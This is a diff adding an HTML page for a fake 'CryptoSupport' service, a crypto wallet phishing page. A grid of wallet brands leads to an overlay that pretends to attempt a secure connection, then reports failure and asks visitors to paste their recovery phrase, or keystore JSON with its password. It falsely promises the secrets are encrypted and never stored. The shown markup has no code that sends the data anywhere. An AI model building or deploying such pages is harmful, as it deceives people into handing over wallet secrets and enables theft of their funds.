@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <base href="/CryptoSupport/">
+  <title>CryptoSupport - Get Help Fast</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/ScrollTrigger.min.js"></script>
+  <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
+  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body class="bg-gray-950 text-white font-sans overflow-x-hidden">
+
+  <!-- ✅ Responsive Navbar -->
+  <header x-data="{ open: false, scrolled: false }"
+  x-init="window.addEventListener('scroll', () => { scrolled = window.scrollY > 10 })"
+  :class="{ 'backdrop-blur-lg shadow-lg bg-gray-900/90': scrolled }"
+  class="sticky top-0 z-50 bg-gray-900 transition-all duration-300">
+  <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+    <h1 class="text-2xl font-bold text-teal-400">CryptoSupport</h1>
+
+    <!-- Desktop Nav -->
+    <nav 
+      x-data="{ active: 'home' }"
+      x-init="
+        const sections = ['home', 'complaints', 'wallet'];
+        window.addEventListener('scroll', () => {
+          for (const id of sections) {
+            const el = document.getElementById(id);
+            if (el && el.getBoundingClientRect().top <= 80 && el.getBoundingClientRect().bottom > 80) {
+              active = id;
+              break;
+            }
+          }
+        });
+      "
+      class="hidden md:flex space-x-6"
+    >
+    <!-- remove all the first /  -->
+      <a href="index.html" :class="{ 'text-teal-400 font-semibold': active === 'home' }" class="nav-link transition">Home</a>
+      <a href="index.html" :class="{ 'text-teal-400 font-semibold': active === 'complaints' }" class="nav-link transition">Complaints</a>
+      <a href="connectwallet/" :class="{ 'text-teal-400 font-semibold': active === 'wallet' }" class="nav-link transition">Connect Wallet</a>
+    </nav>
+
+    <!-- Hamburger Button -->
+    <div class="md:hidden">
+      <button @click="open = !open" class="text-white focus:outline-none">
+        <template x-if="!open">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+               stroke-width="1.5" stroke="currentColor" class="w-7 h-7">
+            <path stroke-linecap="round" stroke-linejoin="round"
+                  d="M4.5 6.75h15M4.5 12h15M4.5 17.25h15" />
+          </svg>
+        </template>
+        <template x-if="open">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+               stroke-width="1.5" stroke="currentColor" class="w-7 h-7">
+            <path stroke-linecap="round" stroke-linejoin="round"
+                  d="M6 18L18 6M6 6l12 12" />
+          </svg>
+        </template>
+      </button>
+    </div>
+  </div>
+
+  <!-- Mobile Nav -->
+  <div x-cloak x-show="open" x-transition.duration.300ms class="md:hidden px-6 pb-4 space-y-2 bg-gray-900 text-white">
+    <a href="index.html" @click="open = false" class="nav-link block y-2 border-b border-gray-700 text-teal-400 font-semibold">Home</a>
+    <a href="index.html" @click="open = false" class=" nav-link block py-2 border-b border-gray-700 hover:text-teal-400 transition">Complaints</a>
+    <a href="connectwallet/" @click="open = false" class="nav-link block py-2 hover:text-teal-400 transition">Connect Wallet</a>
+  </div>
+</header>
+
+
+<section id="wallet" class="min-h-screen py-16 px-6 bg-gradient-to-br from-white via-gray-50 to-white">
+  <div class="max-w-6xl mx-auto">
+    <h2 class="text-3xl sm:text-4xl font-bold text-center text-teal-600 mb-12">
+      Select a Wallet
+    </h2>
+    <div class="flex justify-center mb-12">
+        <div class="animate-spin rounded-full h-12 w-12 border-t-4 border-b-4 border-teal-500"></div>
+    </div>
+
+    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
+      <!-- WalletConnect -->
+      <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+          <img src="assets/images/walletconnect.jpg" alt="WalletConnect" class="h-12">
+          <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">WalletConnect</h3>
+        </div>
+      </a>
+
+      <!-- MetaMask -->
+      <a onclick="openOverlay()" class="cursor-pointer  block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+          <img src="assets/images/metamask.jpg" alt="MetaMask" class="h-12">
+          <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">MetaMask</h3>
+        </div>
+      </a>
+
+      <!-- Trust Wallet -->
+      <a onclick="openOverlay()" class="cursor-pointer  block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+          <img src="assets/images/Trustwallet.jpg" alt="Trust Wallet" class="h-12">
+          <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Trust Wallet</h3>
+        </div>
+      </a>
+
+      <!-- Coinbase Wallet -->
+      <a onclick="openOverlay()" class="cursor-pointer  block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+          <img src="assets/images/coinbase.jpg" alt="Coinbase Wallet" class="h-12 w-auto object-contain" />
+          <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Coinbase Wallet</h3>
+        </div>
+      </a>
+
+      <!-- Phantom -->
+      <a onclick="openOverlay()"" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+          <img src="assets/images/phantom.jpg" alt="Phantom" class="h-12">
+          <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Phantom</h3>
+        </div>
+      </a>
+
+      <!-- Exodus -->
+      <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+          <img src="assets/images/exoduswallet.jpg" alt="Exodus" class="h-12">
+          <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Exodus</h3>
+        </div>
+      </a>
+
+      <!-- Argent -->
+      <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+          <img src="assets/images/xverse.jpg" alt="Argent" class="h-12">
+          <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Xverse</h3>
+        </div>
+      </a>
+
+      <!-- Rainbow -->
+      <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+          <img src="assets/images/uniswap.jpg" alt="Rainbow" class="h-12">
+          <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">uniswap</h3>
+        </div>
+      </a>
+
+      <!-- Safe (Gnosis) -->
+      <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+          <img src="assets/images/okx.jpg" alt="Safe (Gnosis)" class="h-12">
+          <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">OKX</h3>
+        </div>
+      </a>
+
+      <!-- XDEFI Wallet -->
+      <a onclick="openOverlay()"" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+          <img src="assets/images/TokenPocket.jpg" alt="XDEFI Wallet" class="h-12">
+          <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">TokenPocket</h3>
+        </div>
+      </a>
+
+      <!-- BitPay -->
+      <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+          <img src="assets/images/Trustwallet.jpg" alt="BitPay" class="h-12">
+          <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Trust Wallet</h3>
+        </div>
+      </a>
+
+      <!-- Loopring Wallet -->
+      <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+          <img src="assets/images/kardiaChain.jpg" alt="Loopring Wallet" class="h-12">
+          <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">kardiaChain</h3>
+        </div>
+      </a>
+
+        <!-- Atomic Wallet -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/haloWallet.jpg" alt="Atomic Wallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Halo Wallet</h3>
+        </div>
+        </a>
+
+        <!-- Ledger Live -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/polkadot.jpg" alt="Ledger Live" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">polkadot</h3>
+        </div>
+        </a>
+
+        <!-- Trezor Suite -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/Enjinwallet.jpg" alt="Trezor Wallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Enjin Wallet</h3>
+        </div>
+        </a>
+
+        <!-- Enjin Wallet -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/dero.jpg" alt="Enjin Wallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Dero</h3>
+        </div>
+        </a>
+
+        <!-- MathWallet -->
+        <a honclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/keplr.jpg" alt="MathWallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Keplr</h3>
+        </div>
+        </a>
+
+        <!-- Coinomi -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/ledger-live.jpg" alt="Coinomi" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Ledger-Live</h3>
+        </div>
+        </a>
+
+        <!-- Guarda Wallet -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/fantomwallet.jpg" alt="Guarda Wallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Fantom Wallet</h3>
+        </div>
+        </a>
+
+        <!-- TokenPocket -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/polkawallet.jpg" alt="TokenPocket" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Polka Wallet</h3>
+        </div>
+        </a>
+
+        <!-- BitKeep -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/ellipal.jpg" alt="BitKeep" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Ellipal</h3>
+        </div>
+        </a>
+
+        <!-- Zerion -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/zilpaywallet.jpg" alt="Zerion" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Zilpay Wallet</h3>
+        </div>
+        </a>
+
+        <!-- Atomic Wallet -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/coin98wallet.jpg" alt="Atomic Wallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Coin98 Wallet</h3>
+        </div>
+        </a>
+
+        <!-- Ledger Live -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/hashpack.jpg" alt="Ledger Live" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Hashpack</h3>
+        </div>
+        </a>
+
+        <!-- Trezor Suite -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/bloctowallet.jpg" alt="Trezor Wallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Blocto Wallet</h3>
+        </div>
+        </a>
+
+        <!-- Guarda Wallet -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/operawallet.jpg" alt="Guarda Wallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Opera Wallet</h3>
+        </div>
+        </a>
+
+        <!-- Coinomi -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/thorwallet.jpg" alt="Coinomi" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">THOR Wallet</h3>
+        </div>
+        </a>
+
+        <!-- BitPay -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/bifrostwallet.jpg" alt="BitPay" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Bifrost Wallet</h3>
+        </div>
+        </a>
+
+        <!-- TokenPocket -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/solana.jpg" alt="TokenPocket" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">solana</h3>
+        </div>
+        </a>
+
+        <!-- BitKeep -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/binancesmartchain.jpg" alt="BitKeep" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Binance Smart Chain</h3>
+        </div>
+        </a>
+
+        <!-- BoldBear -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/harmony.jpg" alt="BoldBear Wallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Harmony</h3>
+        </div>
+        </a>
+
+        <!-- Pillar -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/ledger.jpg" alt="Pillar Wallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Ledger</h3>
+        </div>
+        </a>
+
+        <!-- SafePal -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/midaswallet.jpg" alt="SafePal" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Midas Wallet</h3>
+        </div>
+        </a>
+
+        <!-- Blocto -->
+        <a onclick="openOverlay()"class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/morixwalllet.jpg" alt="Blocto Wallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">MoriX Wallet</h3>
+        </div>
+        </a>
+
+        <!-- Nabox -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/atwallet.jpg" alt="Nabox Wallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">A.T.Wallet</h3>
+        </div>
+        </a>
+
+        <!-- ZelCore -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/dokwallet.jpg" alt="ZelCore Wallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Dok Wallet</h3>
+        </div>
+        </a>
+
+        <!-- CoolWallet -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/meetone.jpg" alt="CoolWallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">MEET ONE</h3>
+        </div>
+        </a>
+
+        <!-- Ellipal -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/unstoppablewallet.jpg" alt="Ellipal" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Unstoppable Wallet</h3>
+        </div>
+        </a>
+
+        <!-- OneKey -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/xdcwallet.jpg" alt="OneKey Wallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">XDC Wallet</h3>
+        </div>
+        </a>
+
+        <!-- Rabby -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/peakdefiwallet.jpg" alt="Rabby Wallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">PeakDefi Wallet</h3>
+        </div>
+        </a>
+
+        <!-- Zengo -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/swftwallet.jpg" alt="Zengo Wallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">SWFT Wallet</h3>
+        </div>
+        </a>
+
+        <!-- OKX Wallet -->
+        <a onclick="openOverlay()" class="cursor-pointer block group p-6 bg-white rounded-2xl shadow-md hover:shadow-xl border border-gray-200 transition-transform hover:-translate-y-1">
+        <div class="flex flex-col items-center gap-4 text-center">
+            <img src="assets/images/vision.jpg" alt="OKX Wallet" class="h-12">
+            <h3 class="text-lg font-semibold text-gray-800 group-hover:text-teal-600 transition">Vision</h3>
+        </div>
+        </a>
+
+    </div>
+    <div class="cta-connect-wallet w-full flex justify-center mt-10">
+      <a onclick="openOverlay()" 
+        class="cursor-pointer bg-gradient-to-r from-teal-500 to-cyan-600 text-white px-6 py-3 rounded-lg shadow-lg hover:shadow-xl hover:scale-105 transition text-lg font-semibold">
+        Don't see your wallet? Connect manually.
+      </a>
+    </div>
+  </div>
+</section>
+
+
+
+ <!-- Overlay Container -->
+<div id="walletOverlay" class="fixed inset-0 bg-black bg-opacity-60 z-50 hidden flex items-center justify-center">
+  <!-- Modal Content -->
+  <div class="relative bg-white rounded-xl shadow-lg w-full max-w-md p-6 animate-fade-in">
+    
+    <!-- Close Button -->
+    <button onclick="closeOverlay()" class="absolute top-4 right-4 text-gray-500 hover:text-red-600 text-2xl font-bold">&times;</button>
+
+    <!-- Connection Section -->
+    <div id="connectionStatus">
+      <div class="flex flex-col items-center text-center">
+        <div id="connectionSpinner" class="animate-spin rounded-full h-12 w-12 border-t-4 border-b-4 border-teal-500 mb-4"></div>
+        <h2 id="connectionText" class="text-lg font-semibold text-gray-800">
+          Starting Secure Connection...<br>
+          <span class="text-sm text-gray-600">Please wait...</span>
+        </h2>
+      </div>
+    </div>
+
+    <!-- Error Section (hidden by default) -->
+    <div id="errorStatus" class="hidden flex flex-col items-center text-center">
+      <div class="rounded-full h-12 w-12 border-t-4 border-b-4 border-red-500 mb-4"></div>
+      <h2 class="text-lg font-semibold text-red-600 mb-2">🔐 Unable to connect automatically. Please connect manually.</h2>
+      <button onclick="showManualConnect()" class="bg-teal-600 hover:bg-teal-700 text-white px-4 py-2 rounded-lg transition">Connect Manually</button>
+    </div>
+
+    <!-- Manual Connection Form -->
+    <div id="manualConnectForm" class="hidden mt-4">
+      <div class="flex justify-center mb-4 gap-4">
+        <button onclick="switchTab('phrase')" id="tabPhrase" class="px-3 py-1 text-teal-600 border-b-2 border-teal-600 font-semibold">Phrase</button>
+        <button onclick="switchTab('keystore')" id="tabKeystore" class="px-3 py-1 border-b-2 text-teal-600 border-transparent hover:border-teal-300">Keystore JSON</button>
+      </div>
+
+      <!-- Phrase Input -->
+      <div id="phraseInput" class="block">
+        <p class="text-sm text-gray-500 mb-2">🔐 Your information is securely encrypted and never stored.</p>
+        <textarea rows="4" placeholder="Enter 12 or 24-word recovery phrase"
+          class="text-gray-900 placeholder-gray-400 w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-400"></textarea>
+        <p class="text-xs text-gray-500 mt-2">Typically separated by spaces. Example: word1 word2 word3...</p>
+        <button class="mt-4 w-full bg-teal-600 hover:bg-teal-700 text-white py-2 rounded-lg">Import</button>
+      </div>
+
+      <!-- Keystore Input -->
+      <div id="keystoreInput" class="hidden">
+        <p class="text-sm text-gray-500 mb-2">🔐 Your information is securely encrypted and never stored.</p>
+        <textarea rows="4" placeholder="Paste your keystore JSON"
+          class="text-gray-900 placeholder-gray-400 w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-400 mb-3"></textarea>
+        <input type="password" placeholder="Password"
+          class="text-gray-900 placeholder-gray-400 w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-400">
+        <p class="text-xs text-gray-500 mt-2">Paste your exported keystore content above and enter its decryption password.</p>
+        <button class="mt-4 w-full bg-teal-600 hover:bg-teal-700 text-white py-2 rounded-lg">Import</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<footer class="bg-gray-900 text-white py-4 px-3 text-sm">
+  <div class="max-w-7xl mx-auto grid grid-cols-2 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5 gap-6">
+
+    <!-- Partners -->
+    <div>
+      <h3 class="text-base font-semibold mb-3 text-center sm:text-left">Our Partners</h3>
+      <div class="flex flex-wrap gap-2 justify-center sm:justify-start items-center">
+        <img src="https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons/128/color/btc.png" alt="BTC" class="h-6 w-auto grayscale hover:grayscale-0 transition" />
+        <img src="https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons/128/color/eth.png" alt="ETH" class="h-6 w-auto grayscale hover:grayscale-0 transition" />
+        <img src="https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons/128/color/bnb.png" alt="BNB" class="h-6 w-auto grayscale hover:grayscale-0 transition" />
+        <img src="https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons/128/color/dot.png" alt="DOT" class="h-6 w-auto grayscale hover:grayscale-0 transition" />
+        <img src="https://cdn.jsdelivr.net/gh/atomiclabs/cryptocurrency-icons/128/color/ada.png" alt="ADA" class="h-6 w-auto grayscale hover:grayscale-0 transition" />
+      </div>
+    </div>
+
+    <!-- Social Media -->
+    <div>
+      <h3 class="text-base font-semibold mb-3 text-center sm:text-left">Connect with us</h3>
+      <div class="flex justify-center sm:justify-start gap-3">
+        <a href="#Twitter">
+          <img src="https://cdn-icons-png.flaticon.com/512/733/733579.png" alt="Twitter" class="h-5 w-5" />
+        </a>
+        <a href="#Facebook">
+          <img src="https://cdn.simpleicons.org/facebook/1877F2" alt="Facebook" class="h-5 w-5" />
+        </a>
+        <a href="#Instagram">
+          <img src="https://cdn.simpleicons.org/instagram/E4405F" alt="Instagram" class="h-5 w-5" />
+        </a>
+        <a href="#LinkedIn">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.png" alt="LinkedIn" class="h-5 w-5" />
+        </a>
+        <a href="#Discord">
+          <img src="https://cdn.simpleicons.org/discord/5865F2" alt="Discord" class="h-5 w-5" />
+        </a>
+      </div>
+    </div>
+
+    <!-- Live Prices -->
+    <div>
+      <h3 class="text-base font-semibold mb-3 text-center sm:text-left">Live Prices</h3>
+      <div class="overflow-hidden whitespace-nowrap border border-teal-500 rounded-md py-2 px-2 bg-gray-800 text-xs text-teal-400">
+        <div id="price-ticker" class="inline-block animate-pulse">
+          BTC $27,000 &nbsp;&nbsp; ETH $1,800 &nbsp;&nbsp; BNB $320 &nbsp;&nbsp; DOT $6.7 &nbsp;&nbsp; ADA $0.37
+        </div>
+      </div>
+    </div>
+
+    <!-- Quick Links -->
+    <div>
+      <h3 class="text-base font-semibold mb-3 text-center sm:text-left">Quick Links</h3>
+      <ul class="flex flex-wrap justify-center sm:justify-start gap-3 text-xs text-gray-300">
+        <li><a href="#about" class="hover:text-teal-400">About</a></li>
+        <li><a href="#faq" class="hover:text-teal-400">FAQ</a></li>
+        <li><a href="#contact" class="hover:text-teal-400">Contact</a></li>
+        <li><a href="#terms" class="hover:text-teal-400">Terms</a></li>
+        <li><a href="#privacy" class="hover:text-teal-400">Privacy</a></li>
+      </ul>
+    </div>
+
+    <!-- Newsletter -->
+    <div>
+      <h3 class="text-base font-semibold mb-3 text-center sm:text-left">Newsletter</h3>
+      <form class="flex gap-1 justify-center sm:justify-start text-xs" onsubmit="event.preventDefault(); alert('Subscribed!');">
+        <input type="email" placeholder="Your email" required
+          class="px-2 py-1.5 rounded-l-md border border-gray-600 bg-gray-800 text-white focus:outline-none focus:border-teal-400" />
+        <button type="submit"
+          class="bg-teal-600 hover:bg-teal-700 px-2 py-1.5 rounded-r-md font-medium transition">Subscribe</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Bottom -->
